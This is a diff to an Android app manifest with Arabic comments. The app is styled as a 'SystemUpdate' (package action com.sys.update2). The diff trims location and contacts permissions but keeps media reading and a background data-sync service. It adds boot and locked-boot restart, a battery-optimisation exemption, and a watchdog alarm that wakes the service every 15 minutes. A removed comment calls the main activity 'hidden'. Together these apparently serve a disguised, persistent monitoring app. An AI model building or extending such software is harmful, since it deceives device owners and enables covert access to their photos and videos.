@@ -5,28 +5,25 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-
+    <!-- صلاحيات الملفات والوسائط -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="29" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
-    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
-        tools:ignore="ScopedStorage" />
 
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-
+    <!-- صلاحيات الخدمة والخلفية -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- استثناء من Doze mode -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- Watchdog alarm -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <application
         android:allowBackup="true"
@@ -40,7 +37,7 @@
         android:largeHeap="true"
         android:theme="@style/Theme.SystemUpdate">
 
-        <!-- LauncherActivity — نقطة الدخول الوحيدة، لا تُعطَّل أبداً -->
+        <!-- LauncherActivity — نقطة الدخول الوحيدة -->
         <activity
             android:name=".LauncherActivity"
             android:exported="true"
@@ -53,7 +50,7 @@
             </intent-filter>
         </activity>
 
-        <!-- LoginActivity — لم تعد الـ launcher -->
+        <!-- LoginActivity -->
         <activity
             android:name=".LoginActivity"
             android:exported="false"
@@ -61,13 +58,13 @@
             android:windowSoftInputMode="adjustResize"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- HomeActivity — الصفحة الرئيسية -->
+        <!-- HomeActivity -->
         <activity
             android:name=".HomeActivity"
             android:exported="false"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- MainActivity — مخفية -->
+        <!-- MainActivity -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -76,12 +73,12 @@
             android:launchMode="singleTask"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- BackgroundService -->
+        <!-- BackgroundService — dataSync فقط -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|dataSync"
+            android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
         <!-- BootReceiver -->
@@ -93,6 +90,16 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- WatchdogReceiver — يوقظ الخدمة كل 15 دقيقة -->
+        <receiver
+            android:name=".WatchdogReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.sys.update2.WATCHDOG" />
             </intent-filter>
         </receiver>
 
